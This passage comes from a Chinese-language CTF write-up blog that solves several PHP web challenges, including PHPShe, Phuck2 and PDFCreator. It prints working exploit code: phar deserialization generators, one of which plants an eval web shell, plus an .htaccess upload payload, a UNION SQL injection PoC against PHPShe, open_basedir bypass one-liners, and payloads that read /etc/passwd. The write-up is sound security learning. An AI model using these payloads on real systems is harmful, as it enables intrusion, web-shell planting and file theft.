class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddHandler php7-script .txt</span><br></pre></td></tr></table></figure><p>写入的.htaccess</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">action&#x3D;upload&amp;url&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,QWRkSGFuZGxlciBwaHA3LXNjcmlwdCAudHh0&amp;filename&#x3D;.htaccess</span><br></pre></td></tr></table></figure><p>这里要获取<code>upload/</code>目录的绝对路径，可以通过<code>__destruct()</code>中的 <code>echo $string;</code> 触发<code>__toString()</code>，打印<code>__DIR__</code>，phar可以进行gzip压缩，从而绕过对一些字符的检查</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">dir</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $userdir;</span><br><span class="line">    <span class="keyword">public</span> $url;</span><br><span class="line">    <span class="keyword">public</span> $filename;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$d = <span class="keyword">new</span> dir();</span><br><span class="line">$d-&gt;userdir = <span class="keyword">new</span> dir();</span><br><span class="line">$d-&gt;userdir-&gt;userdir = <span class="string">"../"</span>;</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($d));</span><br><span class="line">$phar = <span class="keyword">new</span> Phar(<span class="string">"somnus2.phar"</span>);</span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;setStub(<span class="string">"GIF89A"</span>.<span class="string">"__HALT_COMPILER();"</span>); <span class="comment">//设置stub，增加gif文件头用以欺骗检测</span></span><br><span class="line">$phar-&gt;setMetadata($d); <span class="comment">//将自定义meta-data存入manifest</span></span><br><span class="line">$phar-&gt;addFromString(<span class="string">"test.jpg"</span>, <span class="string">"test"</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line">$phar-&gt;stopBuffering();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>进行gzip压缩，再放到内网靶机的web服务下</p><p>先上传</p><img src="/2020/08/06/remaining/3.png" class=""><p>再用phar触发反序列化</p><img src="/2020/08/06/remaining/4.png" class=""><p>同样的，接下来再绝对路径中写入shell</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="class"><span class="keyword">class</span> <span class="title">dir</span></span>&#123;</span><br><span class="line">      <span class="keyword">public</span> $userdir;</span><br><span class="line">      <span class="keyword">public</span> $filename;</span><br><span class="line">      <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;filename = <span class="string">'/var/www/html/45f6a4a57549a572/upload/adeee0c170ad4ffb110df0cde294aecd/shell'</span>;<span class="comment">//这里不需要加后缀</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;userdir = <span class="string">'aaaaaaaaaaa&lt;?php phpinfo();eval($_POST[cmd]);?&gt;aaaaaaa'</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    $a = <span class="keyword">new</span> dir();</span><br><span class="line">    <span class="comment">// var_dump($a);</span></span><br><span class="line">    @unlink(<span class="string">"phar.phar"</span>);</span><br><span class="line">    $phar = <span class="keyword">new</span> Phar(<span class="string">"phar.phar"</span>); <span class="comment">//后缀名必须为phar</span></span><br><span class="line">    $phar-&gt;startBuffering();</span><br><span class="line">    $phar-&gt;setStub(<span class="string">"&lt;?php __HALT_COMPILER(); ?&gt;"</span>); <span class="comment">//设置stub</span></span><br><span class="line">    $phar-&gt;setMetadata($a); <span class="comment">//将自定义的meta-data存入manifest</span></span><br><span class="line">    $phar-&gt;addFromString(<span class="string">"test.txt"</span>, <span class="string">"test"</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line">    <span class="comment">//签名自动计算</span></span><br><span class="line">    $phar-&gt;stopBuffering();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>前后瞎凑的字符串为了绕过过滤</p><img src="/2020/08/06/remaining/5.png" class=""><p>到这里能访问就能看到phpinfo页面了，但是环境问题没成功，那个上传后的目录不能访问</p><p>最后还有一步就是绕过<code>open_basedir和disable_function</code></p><p>直接用蚁剑的插件就能绕过拿到flag了，这里就没图能贴了，或者是</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">chdir(<span class="string">'..'</span>);ini_set(<span class="string">'open_basedir'</span>,<span class="string">'..'</span>);chdir(<span class="string">'..'</span>);chdir(<span class="string">'..'</span>);chdir(<span class="string">'..'</span>);chdir(<span class="string">'..'</span>);chdir(<span class="string">'..'</span>);chdir(<span class="string">'..'</span>);ini_set(<span class="string">'open_basedir'</span>,<span class="string">'/'</span>);var_dump(scandir(<span class="string">'/'</span>));</span><br><span class="line"></span><br><span class="line">ini_set(<span class="string">'open_basedir'</span>, <span class="string">'..'</span>);chdir(<span class="string">'..'</span>);chdir(<span class="string">'..'</span>);chdir(<span class="string">'..'</span>);chdir(<span class="string">'..'</span>);chdir(<span class="string">'..'</span>);chdir(<span class="string">'..'</span>);ini_set(<span class="string">'open_basedir'</span>, <span class="string">'/'</span>);var_dump(show_source(<span class="string">'/F1aG_1s_H4r4'</span>));</span><br></pre></td></tr></table></figure><p>也可以拿到flag，那这题就到这了，学到东西才是真，flag不重要(233333)</p><h2 id="RoarCTF-2019-PHPShe"><a href="#RoarCTF-2019-PHPShe" class="headerlink" title="[RoarCTF 2019]PHPShe"></a>[RoarCTF 2019]PHPShe</h2><h2 id="知识点-2"><a href="#知识点-2" class="headerlink" title="知识点"></a>知识点</h2><ul><li>无列名注入</li><li>phar反序列化</li><li>代码审计</li><li>获取token</li></ul><h2 id="解题步骤-2"><a href="#解题步骤-2" class="headerlink" title="解题步骤"></a>解题步骤</h2><p>题目给了源码，直接下载</p><p>开题，phpshe一个商户框架，查一下CVE(<a href="https://anquan.baidu.com/article/697" target="_blank" rel="noopener">https://anquan.baidu.com/article/697</a>)</p><p>比较源码，XXE<strong>（CVE-2019-9761）</strong>因为删除了notify_url.php这个文件，不能用</p><p>看一下<strong>无限制SQL注入分析（CVE-2019-9762）</strong>，跟着文章一步步看，直接看重点</p><p>漏洞利用点的入口在include/plugin/payment/alipay/pay.php，这里是唯一有回显的位置，poc：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/include/plugin/payment/alipay/pay.php?id=pay`%20where%201=1%20union%20select%201,2,user(),4,5,6,7,8,9,10,11,12%23_</span><br></pre></td></tr></table></figure><img src="/2020/08/06/remaining/6.png" class=""><p>因为过滤了下划线，这里要用到无列名注入</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/include/plugin/payment/alipay/pay.php?id=pay`%20where%201=1%20union%20select%201,2,(<span class="keyword">select</span><span class="string">`3`</span><span class="keyword">from</span>(<span class="keyword">select</span>%<span class="number">201</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>%<span class="number">20</span><span class="keyword">union</span>%<span class="number">20</span><span class="keyword">select</span>%<span class="number">20</span>*%<span class="number">20</span><span class="keyword">from</span>%<span class="number">20</span><span class="keyword">admin</span>)a%<span class="number">20</span><span class="keyword">limit</span>%<span class="number">201</span>,<span class="number">1</span>),<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">12</span>%<span class="number">23</span>_</span><br></pre></td></tr></table></figure><img src="/2020/08/06/remaining/7.png" class=""><p>拿到MD5加密后的密码，解密得到admin/altman777，登录后台</p><p>在品牌管理处发现可以上传文件，这里因为就是利用点了</p><img src="/2020/08/06/remaining/8.png" class=""><p>本题目的源代码在<code>/include/class/pclzip.class.php</code>多了个析构魔术方法</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">      <span class="keyword">$this</span>-&gt;extract(PCLZIP_OPT_PATH, <span class="keyword">$this</span>-&gt;save_path);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>跟进第一个参数，在<code>module/admin/moban.php</code></p><img src="/2020/08/06/remaining/9.png" class=""><p>这个类起到解压缩的作用，那么应该会用到phar协议</p><p>同时，在moban.php中可以看到，引用了<code>pclzip.class.php</code></p><img src="/2020/08/06/remaining/10.png" class=""><p>继续往下看，看到了del方法</p><img src="/2020/08/06/remaining/11.png" class=""><p>跟进一下pe_dirdel方法</p><img src="/2020/08/06/remaining/12.png" class=""><p>看到了is_file，那么phar的触发点就找到了</p><p>思路清晰了，通过moban.php的del功能传入<strong>tpl</strong>参数，通过<strong>is_file</strong>函数触发<strong>phar反序列化</strong>，对之前上传的包含shell的zip文件进行解压缩得到shell</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PclZip</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> $zipname = <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">var</span> $zip_fd = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">var</span> $error_code = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">var</span> $error_string = <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">var</span> $magic_quotes_status;</span><br><span class="line">    <span class="keyword">var</span> $save_path;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($p_zipname)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;zipname = $p_zipname;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;zip_fd = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;magic_quotes_status = <span class="number">-1</span>;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$f=<span class="keyword">new</span> PclZip(<span class="string">"/var/www/html/data/attachment/brand/5.zip"</span>);</span><br><span class="line">$f-&gt;save_path=<span class="string">'/var/www/html/data'</span>;</span><br><span class="line"><span class="keyword">echo</span> serialize($f);</span><br><span class="line">$phar = <span class="keyword">new</span> Phar(<span class="string">"phar.phar"</span>);</span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;setStub(<span class="string">"GIF89a"</span>,<span class="string">"&lt;?php __HALT_COMPILER(); ?&gt;"</span>);</span><br><span class="line">$phar-&gt;setMetadata($f);</span><br><span class="line">$phar-&gt;addFromString(<span class="string">"test.txt"</span>, <span class="string">"test"</span>);</span><br><span class="line">$phar-&gt;stopBuffering();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>主要的参数就是上传的shell路径以及保存的路径</strong></p><p>上传路径在上传之后能够看到</p><img src="/2020/08/06/remaining/13.png" class=""><p>上传小🐎之后修改exp中的路径即可</p><p>之后再上传phar文件，抓包修改文件名为1.txt</p><p>这里还要注意的点就是token的获取，token在备份的数据库恢复时能够获取得到</p><img src="/2020/08/06/remaining/14.png" class=""><p>这样一来token就到手了，之后再带上referer</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Referer:http://c9ef4168-ae76-49ee-aa39-1808fc8dfd36.node3.buuoj.cn/admin.php?mod=moban</span><br></pre></td></tr></table></figure><p>进行删除操作来解压缩上传的小🐎压缩包</p><img src="/2020/08/06/remaining/15.png" class=""><p>下面就能访问data下的小🐎文件了，读取一下根目录找到flag文件，再读取内容</p><img src="/2020/08/06/remaining/16.png" class=""><h2 id="Phuck2"><a href="#Phuck2" class="headerlink" title="Phuck2"></a>Phuck2</h2><h3 id="知识点-3"><a href="#知识点-3" class="headerlink" title="知识点"></a>知识点</h3><ul><li>DATA URL</li><li>file_get_contents和include处理data：特性</li></ul><h2 id="解题步骤-3"><a href="#解题步骤-3" class="headerlink" title="解题步骤"></a>解题步骤</h2><p>这题打开全是白的，不知道怎么整，看了源码要传入hl参数才能看到源码，这谁想得到</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">    stream_wrapper_unregister(<span class="string">'php'</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'hl'</span>])) highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    $mkdir = <span class="function"><span class="keyword">function</span><span class="params">($dir)</span> </span>&#123;</span><br><span class="line">        system(<span class="string">'mkdir -- '</span>.escapeshellarg($dir));</span><br><span class="line">    &#125;;</span><br><span class="line">    $randFolder = bin2hex(random_bytes(<span class="number">16</span>));</span><br><span class="line">    $mkdir(<span class="string">'users/'</span>.$randFolder);</span><br><span class="line">    chdir(<span class="string">'users/'</span>.$randFolder);</span><br><span class="line">    $userFolder = (<span class="keyword">isset</span>($_SERVER[<span class="string">'HTTP_X_FORWARDED_FOR'</span>]) ? $_SERVER[<span class="string">'HTTP_X_FORWARDED_FOR'</span>] : $_SERVER[<span class="string">'REMOTE_ADDR'</span>]);</span><br><span class="line">    $userFolder = basename(str_replace([<span class="string">'.'</span>,<span class="string">'-'</span>],[<span class="string">''</span>,<span class="string">''</span>],$userFolder));</span><br><span class="line">    $mkdir($userFolder);</span><br><span class="line">    chdir($userFolder);</span><br><span class="line">    file_put_contents(<span class="string">'profile'</span>,print_r($_SERVER,<span class="keyword">true</span>));</span><br><span class="line">    chdir(<span class="string">'..'</span>);</span><br><span class="line">    $_GET[<span class="string">'page'</span>]=str_replace(<span class="string">'.'</span>,<span class="string">''</span>,$_GET[<span class="string">'page'</span>]);</span><br><span class="line">    <span class="keyword">if</span>(!stripos(file_get_contents($_GET[<span class="string">'page'</span>]),<span class="string">'&lt;?'</span>) &amp;&amp; !stripos(file_get_contents($_GET[<span class="string">'page'</span>]),<span class="string">'php'</span>)) &#123;</span><br><span class="line">        <span class="keyword">include</span>($_GET[<span class="string">'page'</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    chdir(<span class="keyword">__DIR__</span>);</span><br><span class="line">    system(<span class="string">'rm -rf users/'</span>.$randFolder);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>一开始就ban掉了php数据流，后面的escapeshellarg过滤了传入的参数，绕不过</p><p>接着往下走，<code>X-Forwarded-For</code>头中的目录名会赋值给$userFolder，并且过滤了.和-,下面将数据写入了$userFolder/profile中，没有任何过滤，在$page中过滤了点号，看到了include应该是包含了，不过这里又过滤了<code>&lt;?</code>和<code>php</code></p><p>重点来了，关于 include 与 file_get_contents对Data URI 处理上的问题</p><p>自己小小测试一把</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">print</span>(<span class="keyword">include</span>(<span class="string">"data:,profile"</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;br /&gt;'</span>;</span><br><span class="line"><span class="keyword">print</span>(file_get_contents(<span class="string">"data:,profile"</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><img src="/2020/08/06/remaining/17.png" class=""><p>可以看到<code>file_get_content()</code>正常返回，<code>include()</code>报错，这里忘记说了，当时的比赛应该给了hint，<code>allow_url_include = Off,allow_url_fopen = On</code></p><p>在这种情况下要怎么做呢，这就是<code>include()</code>在不允许包含的情况下，如果说DATA URL是个目录文件就可以绕过</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">print</span>(<span class="keyword">include</span>(<span class="string">"data:,123456/profile"</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;br /&gt;'</span>;</span><br><span class="line"><span class="keyword">print</span>(file_get_contents(<span class="string">"data:,123456/profile"</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><img src="/2020/08/06/remaining/18.png" class=""><p>可以看到正常包含了，返回了1</p><p>这里就可以这样做了</p><img src="/2020/08/06/remaining/19.png" class=""><p>下面只需要更改写入的内容执行代码，这里不用cat读取内容，直接如图中所示即可</p><img src="/2020/08/06/remaining/20.png" class=""><h2 id="Chaos-Communication-Camp-2019-PDFCreator"><a href="#Chaos-Communication-Camp-2019-PDFCreator" class="headerlink" title="[Chaos Communication Camp 2019]PDFCreator"></a>[Chaos Communication Camp 2019]PDFCreator</h2><h3 id="知识点-4"><a href="#知识点-4" class="headerlink" title="知识点"></a>知识点</h3><ul><li>phar反序列化</li><li>/etc/nginx/nginx.conf配置信息</li></ul><h3 id="解题步骤-4"><a href="#解题步骤-4" class="headerlink" title="解题步骤"></a>解题步骤</h3><p>直接看给的源码，down一份下来</p><p>在index.php中</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">"pdfcontent"</span>]))</span><br><span class="line">&#123;</span><br><span class="line">$creator = <span class="keyword">new</span> \PDFStuff\PDFCreator();</span><br><span class="line">$creator-&gt;createPdf($_POST[<span class="string">"pdfcontent"</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>在PDFStuff命名空间下有一个PDFCreator类，跟一下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">PDFStuff</span></span><br><span class="line">&#123;</span><br><span class="line">include 'TCPDF/tcpdf.php';</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PDFCreator</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">   <span class="keyword">public</span> $tmpfile;</span><br><span class="line">   <span class="keyword">public</span> $finalfile;</span><br><span class="line">   </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">   <span class="keyword">if</span> (file_exists(<span class="keyword">$this</span>-&gt;tmpfile))</span><br><span class="line">   &#123;</span><br><span class="line">   $info = pathinfo(<span class="keyword">$this</span>-&gt;tmpfile);</span><br><span class="line">   <span class="keyword">if</span> ($info[<span class="string">'extension'</span>] == <span class="string">"pdf"</span>)</span><br><span class="line">   &#123;</span><br><span class="line">   unlink(<span class="keyword">$this</span>-&gt;tmpfile);</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">else</span></span><br><span class="line">   &#123;</span><br><span class="line">   <span class="keyword">echo</span> <span class="string">"Could not delete created PDF: Not a pdf. Check the file: "</span> . file_get_contents(<span class="keyword">$this</span>-&gt;tmpfile);</span><br><span class="line">   &#125;</span><br><span class="line">   &#125;</span><br><span class="line">   &#125;</span><br><span class="line">   &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>可以看到<em>\</em>destruct()魔术方法中在判断文件存在并且不是pdf文件后，会包含这个文件读取内容，这里就想到了phar协议</p><p>利用点在</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>Converted by CoolPDF<span class="tag">&lt;/<span class="name">h1</span>&gt;</span><span class="tag">&lt;<span class="name">h3</span>&gt;</span>We hope you enjoyed our service!<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"phar://./upload/d7f4be9d064bac5fd42207b3d7efe102_10.jpg"</span> <span class="attr">width</span>=<span class="string">"10"</span> <span class="attr">height</span>=<span class="string">"10"</span>&gt;</span></span><br></pre></td></tr></table></figure><p>src这里可以利用phar://来进行解析</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">PDFStuff</span>&#123;</span><br><span class="line">        <span class="title">class</span> <span class="title">PDFCreator</span>&#123;</span><br><span class="line">                public $tmpfile='/etc/passwd';</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line">$<span class="title">a</span>=<span class="title">new</span> \<span class="title">PDFStuff</span>\<span class="title">PDFCreator</span>();</span><br><span class="line">@unlink(<span class="string">"phar.phar"</span>);</span><br><span class="line">$phar=<span class="keyword">new</span> \Phar(<span class="string">"phar.phar"</span>);</span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;setStub(<span class="string">'GIF89a'</span>.<span class="string">"&lt;?php __HALT_COMPILER(); ?&gt;"</span>);</span><br><span class="line">$phar-&gt;setMetadata($a);</span><br><span class="line">$phar-&gt;addFromString(<span class="string">"test.txt"</span>, <span class="string">"test"</span>);</span><br><span class="line">$phar-&gt;stopBuffering();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/2020/08/06/remaining/21.png" class=""><p>这里要注意得是web服务目录不是/var/www/html,得读取nginx配置信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;etc&#x2F;nginx&#x2F;nginx.conf</span><br></pre></td></tr></table></figure><img src="/2020/08/06/remaining/22.png" class=""><p>得到根目录是<code>/var/www/site</code></p><p>读取之前扫到得flag.php即可</p><img src="/2020/08/06/remaining/23.png" class="">]]></content>
      
      
      
        <tags>
            
            <tag> buu </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SWPUCTF2016-Web-blogsys</title>
      <link href="/2020/08/04/SWPUCTF2016-Web-blogsys/"/>
      <url>/2020/08/04/SWPUCTF2016-Web-blogsys/</url>
      
        <content type="html"><![CDATA[<h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点<a id="more"></a></h2><ul><li>代码审计序列化</li><li>MD5加盐</li><li>MD5扩展攻击</li><li>SQL注入</li></ul><h2 id="解题步骤"><a href="#解题步骤" class="headerlink" title="解题步骤"></a>解题步骤</h2><p>官方wp说是在/web.zip能够拿到源码，这里用了SYC和dirsearch都没有发现有隐藏文件，直接看了源码</p><p><code>common.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">foreach</span> (<span class="keyword">Array</span>(<span class="string">"_POST"</span>, <span class="string">"_GET"</span>, <span class="string">"_COOKIE"</span>) <span class="keyword">as</span> $key) &#123;</span><br><span class="line">    <span class="keyword">foreach</span> ($$key <span class="keyword">as</span> $k =&gt; $v) &#123;</span><br><span class="line">        <span class="keyword">if</span> (is_array($v)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"hello,hacker!"</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $k[<span class="number">0</span>] != <span class="string">'_'</span> ? $$k = addslashes($v) : $$k = <span class="string">""</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里存在变量覆盖，但是common.php文件在开始被引用，到最后代码值依旧会被重新覆盖，不能控制变量</p><p><code>riji.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">"common.php"</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">if</span> (@$_SESSION[<span class="string">'login'</span>] !== <span class="number">1</span>) &#123;</span><br><span class="line">    header(<span class="string">'Location:/index.php'</span>);</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ($_SESSION[<span class="string">'user'</span>]) &#123;</span><br><span class="line">    $username = $_SESSION[<span class="string">'user'</span>];</span><br><span class="line">    @mysql_conn();</span><br><span class="line">    $sql = <span class="string">"select * from user where name='$username'"</span>;</span><br><span class="line">    $result = @mysql_fetch_array(mysql_query($sql));</span><br><span class="line">    mysql_close();</span><br><span class="line">    <span class="keyword">if</span> ($result[<span class="string">'userid'</span>]) &#123;</span><br><span class="line">        $id = intval($result[<span class="string">'userid'</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>不难发现，登录成功之后session就会存在，如果登录之后，再删除该用户，数据库中就找不到该用户信息，那么$id未被初始化，就可控</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span 